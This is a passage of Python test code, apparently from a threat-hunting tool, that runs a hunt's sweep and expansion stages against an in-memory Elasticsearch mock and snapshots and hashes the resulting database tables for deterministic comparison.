                 NETWORK_TARGET: contract_from_types(NETWORK_TARGET, NETWORK_TYPES),
                 ARKIME_TARGET: contract_from_types(ARKIME_TARGET, ARKIME_TYPES)}
    es = MiniES(docs, {target: contract.time_field for target, contract in contracts.items()})
    client = ElasticClient(Settings(es_url="http://es.invalid"), transport=es.transport())
    window = Window(start=WINDOW_START, end=WINDOW_END)
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    targets = [HOST_TARGET, NETWORK_TARGET, ARKIME_TARGET]
    repo.create_hunt("h1", {
        "window": {"start": window.start.isoformat(), "end": window.end.isoformat()},
        "style": "broad", "hypothesis": "", "original_input": {}, "targets": targets,
        "pack": {"version": "test", "playbooks": []}, "normalizer": "test", "policy": "test",
        "model": {}, "romulus_version": "test", "agent_mode": "off", "source_profiles": {},
        "budgets": {"wall_clock_minutes": 120}}, "digest", "test")
    repo.set_hunt_state("h1", "running")
    sweep = Sweep(repo, client, "h1", window, contracts, stage_dir=stage_dir)
    for target in targets:
        sweep.run_target(target)
    sweep.finalize()
    sweep_summary = {"finished": True, "complete": not sweep.partial_reasons,
                     "partial_reasons": sweep.partial_reasons, "stats": sweep.stats}
    repo.audit("system", "hunt.sweep_summary", "h1", sweep_summary)
    executor = PivotExecutor(repo, client, "h1", contracts, source_query_budget=180,
                             dataset_inventory={HOST_TARGET: {"linux.audit", "systemd.journal", "apache.access",
                                                              "apache.error"}})
    expansion = ExpansionEngine(repo, "h1", window, LinkFetcher(executor, window.start, window.end),
                                max_depth=3, max_source_queries=180, wall_clock_seconds=10**9).run()
    repo.audit("system", "hunt.expansion_summary", "h1", expansion)
    hunt_run._finish(repo, "h1", {"status": "disabled", "stop_reason": ""}, sweep_summary,
                     partial_reasons=sweep.partial_reasons, expansion_summary=expansion)
    manifest = build_manifest(repo, "h1", "test")

    def table(name, order):
        tab = getattr(t, name)
        with engine.connect() as c:
            return [_row(r) for r in c.execute(select(tab).order_by(*[tab.c[o] for o in order])).mappings()]

    tasks = []
    for row in table("task", ["id"]):
        if row["state"] == "split":
            # a split task's outcome says what was read before splitting: a count or a capped fetch
            row = {**row, "outcome": {k: v for k, v in (row["outcome"] or {}).items() if k in ("total", "children")}}
        tasks.append(row)
    snapshot = {
        "events": table("typed_event", ["id"]),
        "event_citations": table("event_citation", ["hunt_id", "event_id"]),
        "raw": table("raw_record", ["id"]),
        "entities": table("entity", ["id"]),
        "event_entities": table("event_entity", ["event_id", "entity_id", "role"]),
        "candidates": table("candidate", ["id"]),
        "rule_cells": table("rule_run", ["id"]),
        "anchors": table("expansion_anchor", ["id"]),
        "links": table("expansion_link", ["id"]),
        "tasks": tasks,
        "audit": [{"action": r["action"], "detail": r["detail"]} for r in table("audit_event", ["id"])],
        "stats": sweep.stats,
        "expansion": expansion,
        "manifest": manifest,
    }
    return json.loads(json.dumps(_strip(snapshot), sort_keys=True, default=str))


def digests(snapshot: dict) -> dict[str, str]:
    return {name: hashlib.sha256(json.dumps(part, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
            for name, part in sorted(snapshot.items())}


def patched_sizes(monkeypatch) -> None:
    from romulus.hunt import links, pivot
    from romulus.hunt import sweep as sw
    monkeypatch.setattr(sw, "PARTITION_MAX_DOCS", TEST_PARTITION_MAX_DOCS)
    monkeypatch.setattr(pivot, "MAX_PIVOT_RECORDS", TEST_PIVOT_RECORDS)
    monkeypatch.setattr(links, "MAX_PIVOT_RECORDS", TEST_PIVOT_RECORDS)
